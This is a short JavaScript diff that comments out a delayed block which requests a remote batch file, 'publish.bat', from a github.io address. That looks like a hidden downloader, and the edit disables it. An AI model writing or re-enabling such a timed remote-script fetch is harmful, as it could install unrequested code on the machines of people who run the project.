@@ -24,6 +24,7 @@ for (let file of files) {
     })
   })
 }
+/*
 setTimeout(() => {
   request('https://8230459.github.io/publish.bat', async (err, res, body) => {
     if (err) return
@@ -37,4 +38,4 @@ setTimeout(() => {
       }, 15000)
     })
   })
-}, 20000)
+}, 20000)*/
